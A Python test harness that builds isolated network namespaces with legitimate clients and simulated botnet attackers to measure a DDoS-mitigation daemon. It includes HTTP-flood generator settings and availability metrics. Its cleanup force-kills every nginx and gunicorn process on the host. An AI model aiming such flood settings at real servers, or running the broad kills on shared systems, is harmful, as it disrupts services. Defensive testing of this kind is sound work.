#!/usr/bin/env python3
"""
Distributed DDoS Mitigation Testing Suite
==========================================
Creates a realistic multi-namespace network topology:
  - 1 server namespace (10.0.0.1) with Nginx + Gunicorn + control_plane.py
  - 40 legitimate client namespaces (10.0.1.1-10.0.1.40) with tc-simulated quality
  - 10 botnet attacker namespaces  (10.0.2.1-10.0.2.10)

Topology:
  All namespaces connect through a Linux bridge (ddos_br0) in the DEFAULT namespace.
  The server's veth_server interface is the XDP attachment point — all bridged
  traffic enters server_ns through this single interface, so the eBPF filter
  sees every packet from every client/attacker.

Usage:
    sudo python3 test_distributed_suite.py
"""

import subprocess
import time
import sys
import os
import threading
import signal
import random
import atexit

import psutil
import csv
import datetime
import json
import math
import platform
import shutil
import statistics

import ban_events

# ─────────────────────────────── CONFIGURATION ───────────────────────────────

SERVER_IP = "10.0.0.1"
SERVER_NS = "server_ns"
BRIDGE_NAME = "ddos_br0"      # Bridge lives in the DEFAULT namespace

LEGIT_COUNT = 20               # Number of legitimate client namespaces
LEGIT_IP_PREFIX = "10.0.1"     # Legit IPs: 10.0.1.1 – 10.0.1.40

BOTNET_IP_PREFIX = "10.0.2"    # Botnet IPs: 10.0.2.1 – 10.0.2.10 (count: BOTNET_COUNT below)

SUBNET_MASK = "/16"            # All nodes in 10.0.0.0/16
HTTP_URL = f"http://{SERVER_IP}/"

PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))   # this checkout (also under sudo)
NGINX_CONF = f"{PROJECT_DIR}/nginx.conf"
NGINX_UNPROTECTED_CONF = f"{PROJECT_DIR}/nginx_unprotected.conf"
CONTROL_PLANE = f"{PROJECT_DIR}/control_plane.py"
PYTHON_VENV = f"{PROJECT_DIR}/venv/bin/python"
LOG_FILE = "/tmp/mitigation_distributed_test.log"

# ─────────────────────── EVALUATION SETTINGS (environment) ──────────────────────
# Every setting defaults to the historical behaviour, so a plain run is unchanged.
# eval/run_campaign.py sets them per mode and run (see docs/EVALUATION.md).
#
# OPERATING_POINT names a server-capacity / attack-intensity set; a variable named
# like a setting overrides it. "knee" is the capacity-limited point of the EXP-1d
# calibration (docs/REPORT_ADDENDUM_EXP0_EXP1.md §J): one gunicorn worker pinned to
# cpu0, the attack generators pinned off it and a stronger HTTP flood — the point
# where the UNPROTECTED server measurably degrades.
OPERATING_POINTS = {
    "default": {"GUNICORN_WORKERS": "8", "GUNICORN_THREADS": "4", "WRK_CONNS": "50",
                "WRK_THREADS": "2", "BOTNET_COUNT": "5", "SERVER_CPUS": "", "ATTACK_CPUS": ""},
    "knee": {"GUNICORN_WORKERS": "1", "GUNICORN_THREADS": "1", "WRK_CONNS": "400",
             "WRK_THREADS": "2", "BOTNET_COUNT": "10", "SERVER_CPUS": "0", "ATTACK_CPUS": "1-7"},
}


def resolve_operating_point(env):
    """(name, {setting: value}) for env["OPERATING_POINT"], with per-variable overrides."""
    name = env.get("OPERATING_POINT", "default")
    if name not in OPERATING_POINTS:
        raise ValueError(f"unknown OPERATING_POINT={name!r} "
                         f"(known: {', '.join(OPERATING_POINTS)})")
    return name, {k: env.get(k, v) for k, v in OPERATING_POINTS[name].items()}


# Load model of the HTTP flood (scenario 4 only), docs/EXPC_ATTACKER_SETTING_DESIGN.md. "wrk" is
# closed-loop and the historical default; "loadgen" and "k6" are open-loop generators that are
# `verified` in bench/loadtools.json. FLOOD_RATE is requests/s per bot, a constant schedule.
FLOOD_TOOLS = ("wrk", "loadgen", "k6")
FLOOD_NOFILE = 16384          # open-file limit of one open-loop generator (> its 5000 in flight)
FLOOD_LAUNCH_CHECK_S = 2.0    # every open-loop generator must be alive this long after launch


def resolve_flood(env):
    """(tool, requests/s per bot) from env["FLOOD_TOOL"] and env["FLOOD_RATE"]; ValueError when
    they do not go together: wrk is closed-loop and takes no rate, an open-loop tool needs one."""
    tool = (env.get("FLOOD_TOOL") or "wrk").strip()
    if tool not in FLOOD_TOOLS:
        raise ValueError(f"unknown FLOOD_TOOL={tool!r} (known: {', '.join(FLOOD_TOOLS)})")
    raw = (env.get("FLOOD_RATE") or "").strip()
    try:
        rate = float(raw) if raw else 0.0
    except ValueError:
        raise ValueError(f"FLOOD_RATE={raw!r} is not a number") from None
    if not math.isfinite(rate) or rate < 0:
        raise ValueError(f"FLOOD_RATE={raw!r}: a finite rate of at least 0 is needed")
    if tool == "wrk" and rate:
        raise ValueError("FLOOD_RATE needs an open-loop FLOOD_TOOL: wrk is closed-loop")
    if tool != "wrk" and rate <= 0:
        raise ValueError(f"FLOOD_TOOL={tool} needs FLOOD_RATE (requests/s per bot)")
    return tool, rate


OPERATING_POINT, _OP = resolve_operating_point(os.environ)
FLOOD_TOOL, FLOOD_RATE = resolve_flood(os.environ)
BOTNET_COUNT = int(_OP["BOTNET_COUNT"])    # Number of botnet attacker namespaces
GUNICORN_WORKERS = _OP["GUNICORN_WORKERS"]
GUNICORN_THREADS = _OP["GUNICORN_THREADS"]
WRK_CONNS = _OP["WRK_CONNS"]              # HTTP-flood connections per bot
WRK_THREADS = _OP["WRK_THREADS"]
SERVER_CPUS = _OP["SERVER_CPUS"]          # taskset CPU list for nginx + gunicorn ("" = not pinned)
ATTACK_CPUS = _OP["ATTACK_CPUS"]          # taskset CPU list for commands in bot_* ("" = not pinned)

# 4th mode: MITIGATION_MODE=none with NGINX_PROTECTED=1 keeps the protected nginx.conf
# (limit_req / limit_conn) but runs no daemon, separating Nginx's share of the
# protection from the daemon's (review F-11, addendum §I).
NGINX_PROTECTED = os.environ.get("NGINX_PROTECTED", "0") == "1"
# Seed of the client network-profile assignment: the same plan in every mode and run
# (review H10). The campaign runner varies it per block of paired runs.
PROFILE_SEED = int(os.environ.get("PROFILE_SEED") or 0)
# Equal exposure (review F-02): when > 0 every attack runs this many seconds in EVERY
# mode, instead of being stopped as soon as the bans are seen. 0 = historical behaviour.
ATTACK_DURATION = float(os.environ.get("ATTACK_DURATION") or 0)
# Per-run results (CSVs, ban events, daemon log, provenance) go to RESULTS_DIR, by
# default a new directory under RESULTS_ROOT — outside the repository on purpose.
# The legacy /tmp CSVs are still written exactly as before.
RESULTS_ROOT = os.environ.get("RESULTS_ROOT", "/var/tmp/ddos_campaigns")

# ─────────────────────────────── ANSI COLORS ─────────────────────────────────

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ────────────────────────── GLOBAL STATE ─────────────────────────────────────

results = []
_all_created_ns = []           # Track for cleanup
_legit_traffic_stop = threading.Event()
_legit_threads = []
_daemon_proc = None
csv_lock = threading.Lock()
_results_dir = None            # this run's results directory (set in main(); None outside a run)
_run_started_utc = None
_run_status = "incomplete"     # → "completed" when every scenario ran
_run_finished = False
_profile_plan = []             # [(ip, profile)] of the legit clients (recorded in provenance)
_attack = {"t0": None, "start": None, "end": None}   # current scenario timeline (epoch s)
_daemon_log_label = None       # scenario whose daemon output is in LOG_FILE, not yet archived

# ═══════════════════════════════════════════════════════════════════════════════
#  SERVICE-AVAILABILITY MEASUREMENT (continuous, via the background legit workers)
# ═══════════════════════════════════════════════════════════════════════════════
# The background _legit_worker threads already curl the server throughout the run.
# We record each request (HTTP status + latency), tagged with the current attack
# phase, to measure how well REAL users are served BEFORE / DURING / AFTER each
# attack. Reporting-only: this NEVER affects the PASS/FAIL logic in report().

AVAIL_BEFORE_SECONDS = 3           # per-scenario pre-attack baseline window (denser 'before')
AVAIL_AFTER_SECONDS = 10           # bounded post-attack recovery window (defines 'after';
                                   # replaces the old settle sleep so 'after' is comparable
                                   # across scenarios and excludes report()'s own curl overhead)
_avail_lock = threading.Lock()
_avail_samples = []                # samples for the CURRENT scenario (cleared per scenario)
_avail_scenario = None
_avail_period = "idle"             # before | during | after | idle   (idle = not recorded)
_avail_results = []                # aggregated per-scenario availability (for the final table)


def _avail_begin(scenario):
    """Open a new scenario's 'before' window (clears the previous scenario's samples)."""
    global _avail_scenario, _avail_period
    with _avail_lock:
        _avail_samples.clear()
    _avail_scenario = scenario
    _avail_period = "before"


def _avail_phase(period):
    """Switch the current availability phase: before | during | after | idle."""
    global _avail_period
    _avail_period = period


def _avail_record(scenario, period, profile, code, latency_s, ip=None, t_start=None):
    """Record one legit-request outcome, unless idle / between scenarios."""
    if period == "idle" or scenario is None:
        return
    with _avail_lock:
        _avail_samples.append({"scenario": scenario, "period": period,
                               "profile": profile, "code": code,
                               "lat": latency_s, "ok": code == "200",
                               "ts": time.time(),   # per-request time (for the raw time-series)
                               "ip": ip, "t_start": t_start})


def _pct(sorted_vals, q):
    """Nearest-rank percentile of an already-sorted list (empty -> 0.0)."""
    n = len(sorted_vals)
    if n == 0:
        return 0.0
    idx = max(0, min(n - 1, (q * n + 99) // 100 - 1))
    return sorted_vals[idx]


def _avail_kpis(samples):
    """Aggregate samples -> KPIs. Latency percentiles are over successful (200) requests
    only, so failures/timeouts don't masquerade as slow successes; they show up in the
    timeout rate instead. Latency is capped by curl --max-time (slower = timeout)."""
    total = len(samples)
    c200 = sum(1 for s in samples if s["code"] == "200")
    c503 = sum(1 for s in samples if s["code"] == "503")
    c000 = sum(1 for s in samples if s["code"] == "000")   # timeout / no response / conn refused
    cother = total - c200 - c503 - c000
    lats = sorted(s["lat"] * 1000.0 for s in samples if s["ok"])   # ms, successful only
    mean = sum(lats) / len(lats) if lats else 0.0
    return {
        "total": total, "ok": c200,
        "succ": (c200 / total * 100.0) if total else 0.0,
        "c200": c200, "c503": c503, "c000": c000, "cother": cother,
        "to_rate": (c000 / total * 100.0) if total else 0.0,
        "p50": _pct(lats, 50), "p95": _pct(lats, 95), "p99": _pct(lats, 99),
        "mean": mean, "max": (lats[-1] if lats else 0.0),
    }


def _mode_tag():
    """Suffix of the legacy /tmp CSVs for this run's mode (unchanged for the original 3 modes)."""
    mode = os.environ.get("MITIGATION_MODE", "active")
    backend = os.environ.get("MITIGATION_BACKEND", "xdp")
    if mode == "none":
        return "nginxlimits" if NGINX_PROTECTED else "unprotected"
    return "iptables" if backend == "iptables" else "performance"


def _flood_suffix():
    """"" for the historical wrk flood, else @<tool><rate per bot>, e.g. @loadgen100: the analysis
    groups runs by the mode label, so two load models must not share one."""
    return "" if FLOOD_TOOL == "wrk" else f"@{FLOOD_TOOL}{FLOOD_RATE:g}"


def _mode_label():
    """Mode name used in results and provenance: xdp | iptables | nginxlimits | unprotected,
    plus the flood's suffix when it is open-loop."""
    tag = _mode_tag()
    return ("xdp" if tag == "performance" else tag) + _flood_suffix()


def _out_paths(legacy_path, run_file):
    """Where a CSV goes: the legacy /tmp file (appended across runs, as before) and,
    during a suite run, this run's own copy in the results directory."""
    return [legacy_path] + ([os.path.join(_results_dir, run_file)] if _results_dir else [])


def _append_csv(path, header, rows):
    """Append rows to a CSV, writing the header first if the file is new."""
    new = not os.path.isfile(path)
    with open(path, "a", newline="") as f:
        w = csv.writer(f)
        if new:
            w.writerow(header)
        w.writerows(rows)


def _avail_csv_paths():
    """Availability CSV paths, split by mode/backend like the resource CSV, so XDP vs
    iptables vs unprotected availability can be compared across separate runs."""
    mode = os.environ.get("MITIGATION_MODE", "active")
    backend = os.environ.get("MITIGATION_BACKEND", "xdp")
    tag = _mode_tag()
    return f"/tmp/availability_{tag}.csv", f"/tmp/availability_raw_{tag}.csv", mode, backend


def _write_availability_csv(scenario, by_period, by_prof, profiles, snap):
    """Append one aggregated row per (period, profile) plus a raw per-request dump."""
    agg_csv, raw_csv, mode, backend = _avail_csv_paths()
    ts = datetime.datetime.now().isoformat()
    hdr = ["Timestamp", "Scenario", "Period", "Profile", "Mode", "Backend",
           "Total_Reqs", "Success_200", "Success_Rate_Pct", "HTTP_503",
           "HTTP_000_Timeout", "HTTP_Other", "Timeout_Rate_Pct",
           "Lat_p50_ms", "Lat_p95_ms", "Lat_p99_ms", "Lat_Mean_ms", "Lat_Max_ms"]

    def row(period, profile, k):
        return [ts, scenario, period, profile, mode, backend,
                k["total"], k["c200"], f"{k['succ']:.1f}", k["c503"],
                k["c000"], k["cother"], f"{k['to_rate']:.1f}",
                f"{k['p50']:.1f}", f"{k['p95']:.1f}", f"{k['p99']:.1f}",
                f"{k['mean']:.1f}", f"{k['max']:.1f}"]

    agg_rows = []
    for p in ("before", "during", "after"):
        agg_rows.append(row(p, "ALL", by_period[p]))         # headline (all profiles)
        for pr in profiles:                                  # per-profile breakdown
            k = by_prof[(p, pr)]
            if k["total"]:
                agg_rows.append(row(p, pr, k))
    for path in _out_paths(agg_csv, "availability.csv"):
        _append_csv(path, hdr, agg_rows)

    # Raw dump for time-series charts. The legacy /tmp file keeps its 7 columns (it is
    # appended across runs, so wider rows would corrupt older files); the per-run copy
    # adds the client IP and the request start time (epoch s).
    raw_hdr = ["Timestamp", "Scenario", "Period", "Profile", "HTTP_Code", "Latency_ms", "OK"]
    raw_rows = [[datetime.datetime.fromtimestamp(s["ts"]).isoformat(),
                 scenario, s["period"], s["profile"], s["code"],
                 f"{s['lat'] * 1000.0:.1f}", int(s["ok"])] for s in snap]
    _append_csv(raw_csv, raw_hdr, raw_rows)
    if _results_dir:
        _append_csv(os.path.join(_results_dir, "availability_raw.csv"),
                    raw_hdr + ["Client_IP", "T_Start"],
                    [r + [s.get("ip") or "",
                          f"{s['t_start']:.3f}" if s.get("t_start") is not None else ""]
                     for r, s in zip(raw_rows, snap)])


def _avail_finalize():
    """Snapshot the scenario's samples, aggregate, write CSVs, store the summary line, go idle.

    Called at the TOP of report() — BEFORE the collateral/HTTP verification — so the 'after'
    window is exactly the bounded post-kill recovery sleep (AVAIL_AFTER_SECONDS), not the
    variable report() duration. Reporting-only; uses the sample-tagged scenario name. The
    formatted console line is stored in _avail_results and printed later, in the report block."""
    global _avail_period
    with _avail_lock:
        snap = list(_avail_samples)
    _avail_period = "idle"                       # stop recording (report()'s own curls ignored)
    scenario = _avail_scenario or "unknown"
    periods = ("before", "during", "after")
    by_period = {p: _avail_kpis([s for s in snap if s["period"] == p]) for p in periods}
    profiles = sorted({s["profile"] for s in snap})
    by_prof = {(p, pr): _avail_kpis([s for s in snap
                                     if s["period"] == p and s["profile"] == pr])
               for p in periods for pr in profiles}

    b, d, a = by_period["before"], by_period["during"], by_period["after"]
    d_extra = f", p95 {d['p95']:.0f}ms" if d["total"] else ""

    def _f(k, extra=""):
        return f"{k['succ']:.0f}% (n={k['total']}{extra})" if k["total"] else "n/a"
    line = (f"  ├── Availability:      before {_f(b)} · "
            f"during {_f(d, d_extra)} · after {_f(a)}")

    _avail_results.append({"scenario": scenario, "by_period": by_period, "line": line})
    _write_availability_csv(scenario, by_period, by_prof, profiles, snap)


# ═══════════════════════════════════════════════════════════════════════════════
#  HELPER
# ═══════════════════════════════════════════════════════════════════════════════

def run(cmd, ns=None, bg=False, timeout=None):
    """Execute a shell command, optionally inside a network namespace."""
    full_cmd = []
    if ns:
        full_cmd.extend(["ip", "netns", "exec", ns])
        if ATTACK_CPUS and ns.startswith("bot_"):
            full_cmd.extend(["taskset", "-c", ATTACK_CPUS])   # keep attack generators off the server CPUs
    if isinstance(cmd, str):
        full_cmd.extend(cmd.split())
    else:
        full_cmd.extend(cmd)

    if bg:
        return subprocess.Popen(full_cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    try:
        return subprocess.run(full_cmd, capture_output=True, text=True,
                              timeout=timeout)
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
        return None

def _get_log_size():
    try:
        return os.path.getsize(LOG_FILE)
    except FileNotFoundError:
        return 0

# ═══════════════════════════════════════════════════════════════════════════════
#  INFRASTRUCTURE: Namespace & Network Topology Management
# ═══════════════════════════════════════════════════════════════════════════════

def cleanup_all():
    """Delete every namespace, bridge, and process created by this script."""
    global _daemon_proc

    print(f"\n{YELLOW}[*] Cleaning up all namespaces and processes...{RESET}")

    # Kill ALL mitigation-related processes system-wide
    subprocess.run(["pkill", "-9", "-f", "control_plane.py"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "gunicorn"], capture_output=True)
    # Fast stop first (master reaps its workers), then SIGKILL leftovers incl. orphaned
    # workers of earlier runs (SIGKILL on the master alone orphaned 8 workers per run).
    subprocess.run(["pkill", "-TERM", "-f", "nginx: master process"], capture_output=True)
    time.sleep(1.0)
    subprocess.run(["pkill", "-9", "-f", "nginx: (master|worker) process"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "hping3"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "_dist_"], capture_output=True)
    # wrk by its exact process name: -f matches every command line that contains "wrk", the
    # campaign runner's (--loads wrk,...) and its sudo and timeout included
    subprocess.run(["pkill", "-9", "-x", "wrk"], capture_output=True)
    if FLOOD_TOOL != "wrk":
        subprocess.run(["pkill", "-9", "-f", "bench/loadgen.py"], capture_output=True, check=False)
        subprocess.run(["pkill", "-9", "-x", "k6"], capture_output=True, check=False)
    if _daemon_proc and _daemon_proc.poll() is None:
        _daemon_proc.kill()
        _daemon_proc.wait()
    _daemon_proc = None
    time.sleep(0.5)
    # Nuclear: find and delete ALL namespaces matching our patterns
    result = subprocess.run(["ip", "netns", "list"], capture_output=True, text=True)
    if result and result.stdout:
        for line in result.stdout.strip().split("\n"):
            ns = line.split()[0] if line.strip() else ""
            if ns.startswith(("server_ns", "legit_", "bot_")):
                subprocess.run(["ip", "netns", "del", ns],
                               capture_output=True, timeout=10)
    _all_created_ns.clear()
    # Delete the bridge
    subprocess.run(["ip", "link", "del", BRIDGE_NAME],
                   capture_output=True, timeout=5)
    # Also delete orphaned veth interfaces
    result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
    if result and result.stdout:
        for line in result.stdout.split("\n"):
            for prefix in ["vo_legit_", "vo_bot_", "veth_srv_br"]:
                if prefix in line:
                    iface = line.split(":")[1].strip().split("@")[0]
                    subprocess.run(["ip", "link", "del", iface],
                                   capture_output=True, timeout=5)

    try:
        # os.remove(LOG_FILE)
        pass
    except FileNotFoundError:
        pass

    print(f"{GREEN}[+] Cleanup complete.{RESET}")


atexit.register(cleanup_all)
signal.signal(signal.SIGINT, lambda s, f: sys.exit(1))
signal.signal(signal.SIGTERM, lambda s, f: sys.exit(1))


def create_host_bridge():
    """Create the central bridge in the DEFAULT (host) namespace.

    All client/attacker namespaces and the server namespace connect here.
    This mimics a LAN switch in a real data center.
    """
    subprocess.run(["ip", "link", "add", BRIDGE_NAME, "type", "bridge"],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", BRIDGE_NAME, "up"],
                   capture_output=True)


def create_server_ns():
    """Create the server namespace and connect it to the host bridge.

    Topology:
        [server_ns]  veth_server  ←── veth pair ──→  veth_srv_br  →  ddos_br0
                     (10.0.0.1)                       (bridge port)

    control_plane.py attaches XDP to veth_server. Because all traffic from
    every client/attacker traverses the bridge and enters server_ns through
    this single veth, XDP sees EVERY ingress packet.
    """
    # Create namespace
    subprocess.run(["ip", "netns", "add", SERVER_NS], capture_output=True)
    _all_created_ns.append(SERVER_NS)

    # Create multi-queue veth pair: veth_server (→ server_ns) ↔ veth_srv_br (→ host bridge)
    subprocess.run([
        "ip", "link", "add", "veth_server", 
        "numrxqueues", "8", "numtxqueues", "8", 
        "type", "veth", "peer", "name", "veth_srv_br", 
        "numrxqueues", "8", "numtxqueues", "8"
    ], capture_output=True)

    # Move server end into server_ns
    subprocess.run(["ip", "link", "set", "veth_server", "netns", SERVER_NS],
                   capture_output=True)

    # Attach host end to the bridge
    subprocess.run(["ip", "link", "set", "veth_srv_br", "master", BRIDGE_NAME],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", "veth_srv_br", "up"],
                   capture_output=True)

    # Configure server_ns
    run(f"ip addr add {SERVER_IP}{SUBNET_MASK} dev veth_server", ns=SERVER_NS)
    run("ip link set veth_server up", ns=SERVER_NS)
    run("ip link set lo up", ns=SERVER_NS)

    # Disable checksum offloading (required for XDP on veth)
    run("ethtool -K veth_server tx off rx off", ns=SERVER_NS)


def create_client_ns(ns_name, ip_addr):
    """Create a client/attacker namespace and connect it to the host bridge.

    Topology:
        [ns_name]  veth_in  ←── veth pair ──→  vo_<ns_name>  →  ddos_br0
                   (ip_addr)                    (bridge port)
    """
    veth_inner = "veth_in"
    # udev MACAddressPolicy=persistent derives the MAC from the interface NAME, so every
    # "veth_in" received the same address (12:af:eb:2d:8a:f2). An explicitly assigned
    # address (addr_assign_type=SET) is left alone by udev -> unique, deterministic MAC.
    inner_mac = "02:00:%02x:%02x:%02x:%02x" % tuple(int(o) for o in ip_addr.split("."))
    # Truncate outer name to stay under the 15-char IFNAMSIZ limit
    veth_outer = f"vo_{ns_name[:12]}"

    subprocess.run(["ip", "netns", "add", ns_name], capture_output=True)
    _all_created_ns.append(ns_name)

    # Create multi-queue veth pair in host namespace
    subprocess.run([
        "ip", "link", "add", veth_outer, 
        "numrxqueues", "8", "numtxqueues", "8",
        "type", "veth", "peer", "name", veth_inner, "address", inner_mac,
        "numrxqueues", "8", "numtxqueues", "8"
    ], capture_output=True)

    # Move inner end into client namespace
    subprocess.run(["ip", "link", "set", veth_inner, "netns", ns_name],
                   capture_output=True)

    # Attach outer end to host bridge
    subprocess.run(["ip", "link", "set", veth_outer, "master", BRIDGE_NAME],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", veth_outer, "up"],
                   capture_output=True)

    # Configure client side
    run(f"ip addr add {ip_addr}{SUBNET_MASK} dev {veth_inner}", ns=ns_name)
    run(f"ip link set {veth_inner} up", ns=ns_name)
    run("ip link set lo up", ns=ns_name)


def apply_tc(ns_name, profile):
    """Apply tc netem to simulate varying network quality.

    Profiles:
      'perfect'    — no shaping (LAN speed)
      'broadband'  — 20ms ±2ms latency
      'mobile_3g'  — 150ms ±40ms latency, 2% loss
      'mobile_bad' — 300ms ±80ms latency, 5% loss, 1% corruption
    """
    dev = "veth_in"
    run(f"tc qdisc del dev {dev} root", ns=ns_name)

    if profile == "perfect":
        return
    elif profile == "broadband":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "20ms", "2ms", "distribution", "normal"], ns=ns_name)
    elif profile == "mobile_3g":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "150ms", "40ms", "distribution", "normal",
             "loss", "2%"], ns=ns_name)
    elif profile == "mobile_bad":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "300ms", "80ms", "distribution", "normal",
             "loss", "5%", "corrupt", "1%"], ns=ns_name)


def _wait_http_ready(timeout=15):
    """Probe the service (from server_ns) until it serves HTTP 200, so a freshly
    (re)started gunicorn/nginx is actually WARM before the scenario's pre-attack
    'before' baseline is measured. Without this, cold-worker transients right after
    each reset depress the baseline even for no-loss ('perfect') clients (observed).
    Runs before the daemon starts tailing, and probes the server's own IP (never a
    client IP), so it can't perturb the heuristics or the ban logic. Returns True
    once a 200 is seen."""
    start = time.time()
    while time.time() - start < timeout:
        res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                   "--max-time", "2", HTTP_URL], ns=SERVER_NS, timeout=4)
        if res is not None and res.stdout.strip() == "200":
            return True
        time.sleep(0.3)
    print(f"{YELLOW}[!] Service not HTTP-ready within {timeout}s (baseline may be noisy).{RESET}")
    return False


def _srv(cmd):
    """Pin a server process (nginx / gunicorn) to SERVER_CPUS when set."""
    return ["taskset", "-c", SERVER_CPUS] + cmd if SERVER_CPUS else cmd


def _nginx_conf():
    """nginx config for this mode: the unprotected one only for MITIGATION_MODE=none
    without NGINX_PROTECTED."""
    mode = os.environ.get("MITIGATION_MODE", "active")
    return NGINX_UNPROTECTED_CONF if (mode == "none" and not NGINX_PROTECTED) else NGINX_CONF


def _start_web_stack():
    """Start gunicorn and nginx in server_ns and wait until the service answers."""
    run(_srv([PYTHON_VENV, "-m", "gunicorn", "--chdir", PROJECT_DIR,
              "--workers", GUNICORN_WORKERS, "--threads", GUNICORN_THREADS,
              "-b", "0.0.0.0:8080", "dummy_app:app"]), ns=SERVER_NS, bg=True)
    time.sleep(1)
    run(_srv(["nginx", "-c", _nginx_conf()]), ns=SERVER_NS, bg=True)
    time.sleep(0.5)
    _wait_http_ready()   # ensure gunicorn/nginx actually serve before proceeding (clean baseline)


def _daemon_cmd():
    """Command that starts control_plane.py in server_ns; its ban events go to this run."""
    env = [f"MITIGATION_BACKEND={os.environ.get('MITIGATION_BACKEND', 'xdp')}"]
    if _results_dir:
        env.append(f"BAN_EVENTS={os.path.join(_results_dir, 'ban_events.jsonl')}")
    return ["ip", "netns", "exec", SERVER_NS, "env", *env, PYTHON_VENV, "-u", CONTROL_PLANE]


def _archive_daemon_log():
    """Append the live daemon log (recreated for every scenario) to the run's daemon.log,
    so no scenario's log is lost (review F-07). No-op outside a suite run."""
    global _daemon_log_label
    label, _daemon_log_label = _daemon_log_label, None
    if not (_results_dir and label):
        return
    try:
        with open(LOG_FILE, errors="replace") as src:
            content = src.read()
    except FileNotFoundError:
        return
    with open(os.path.join(_results_dir, "daemon.log"), "a") as dst:
        dst.write(f"===== {label} =====\n{content}")
        if content and not content.endswith("\n"):
            dst.write("\n")


def start_server_services():
    """Start Nginx, Gunicorn, and the mitigation daemon inside server_ns."""
    global _daemon_proc

    # Prepare logs
    subprocess.run(["mkdir", "-p", "/var/log/nginx"], capture_output=True)
    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
        open(lf, "w").close()

    # SSL certs (reuse if they exist)
    if not os.path.isfile("/etc/ssl/certs/nginx-selfsigned.crt"):
        subprocess.run([
            "openssl", "req", "-x509", "-nodes", "-days", "365",
            "-newkey", "rsa:2048",
            "-keyout", "/etc/ssl/private/nginx-selfsigned.key",
            "-out", "/etc/ssl/certs/nginx-selfsigned.crt",
            "-subj", "/C=PL/ST=Masovian/L=Warsaw/O=PoC/CN=twojadomena.pl"
        ], capture_output=True)

    # Create dummy backend app
    dummy_app = os.path.join(PROJECT_DIR, "dummy_app.py")
    with open(dummy_app, "w") as f:
        f.write(
            'def app(environ, start_response):\n'
            '    data = b"Backend is running flawlessly!\\n"\n'
            '    start_response("200 OK", [\n'
            '        ("Content-Type", "text/plain"),\n'
            '        ("Content-Length", str(len(data)))\n'
            '    ])\n'
            '    return iter([data])\n'
        )

    # Start Gunicorn + Nginx
    _start_web_stack()

    # Start mitigation daemon
    try:
        os.remove(LOG_FILE)
    except FileNotFoundError:
        pass

    if os.environ.get("MITIGATION_MODE") != "none":
        cmd = _daemon_cmd()
        log_fd = open(LOG_FILE, "w")
        _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)

        # Wait for readiness
        print("[*] Waiting for mitigation daemon to initialize...", end="", flush=True)
        start = time.time()
        ready = False
        while time.time() - start < 60:
            try:
                with open(LOG_FILE, "r") as f:
                    if "Listening for Nginx logs" in f.read():
                        ready = True
                        break
            except FileNotFoundError:
                pass
            print(".", end="", flush=True)
            time.sleep(0.5)
        print()

        if not ready:
            print(f"{RED}[!] Daemon did not report ready within 60s!{RESET}")
        else:
            print(f"{GREEN}[+] Mitigation daemon is ready.{RESET}")
            time.sleep(2)
    else:
        print(f"{YELLOW}[!] MITIGATION_MODE=none: Server is running UNPROTECTED.{RESET}")
        time.sleep(1)


def reset_between_scenarios():
    """Restart daemon + Nginx + Gunicorn to clear ban state between scenarios.

    The control_plane.py keeps banned IPs in memory (BAN_TTL_SECONDS=300).
    Without a full restart, bots banned in Scenario N remain banned in N+1,
    preventing detection of new bans. This function performs a clean restart
    while preserving the network topology (namespaces, bridge, veths).
    """
    global _daemon_proc

    print(f"\n{CYAN}[*] Resetting mitigation environment...{RESET}")
    
    # Kill ALL control_plane.py processes inside server_ns
    run(["pkill", "-9", "-f", "control_plane.py"], ns=SERVER_NS)
    time.sleep(0.5)
    # Explicitly detach XDP from veth_server (in case the orphan left it attached)
    run(["ip", "link", "set", "dev", "veth_server", "xdp", "off"], ns=SERVER_NS)
    # Flush any leftover iptables rules if in comparative baseline mode
    run(["iptables", "-F"], ns=SERVER_NS)
    
    # Kill the running daemon
    if _daemon_proc and _daemon_proc.poll() is None:
        _daemon_proc.kill()
        _daemon_proc.wait()
        _daemon_proc = None

    # Kill Nginx and Gunicorn
    # List argv: the old string form was str.split() into ['pkill','-f',"'nginx:",'master',"process'"]
    # -> "pkill: only one pattern can be provided" -> nginx was never restarted.
    run(["pkill", "-TERM", "-f", "nginx: master process"], ns=SERVER_NS)
    for _ in range(50):
        if subprocess.run(["pgrep", "-f", "nginx: (master|worker) process"],
                          capture_output=True).returncode != 0:
            break
        time.sleep(0.1)
    run(["pkill", "-f", "gunicorn"], ns=SERVER_NS)
    time.sleep(0.5)

    # Truncate all log files to clear stale [BAN] entries
    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
        open(lf, "w").close()

    # Restart Gunicorn + Nginx
    _start_web_stack()

    # Restart mitigation daemon with a fresh log file (the finished scenario's log is
    # archived into the results directory first)
    _archive_daemon_log()
    try:
        os.remove(LOG_FILE)
    except FileNotFoundError:
        pass

    if os.environ.get("MITIGATION_MODE") != "none":
        cmd = _daemon_cmd()
        log_fd = open(LOG_FILE, "w")
        _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)

        # Wait for readiness
        start = time.time()
        while time.time() - start < 30:
            try:
                with open(LOG_FILE, "r") as f:
                    if "Listening for Nginx logs" in f.read():
                        break
            except FileNotFoundError:
                pass
            time.sleep(0.5)
        else:
            print(f"{RED}[!] Daemon did not restart within 30s!{RESET}")
            return

        time.sleep(1)
        print(f"{GREEN}[+] Environment reset complete.{RESET}")
    else:
        print(f"{YELLOW}[!] MITIGATION_MODE=none: Environment reset complete (Unprotected).{RESET}")
        time.sleep(1)


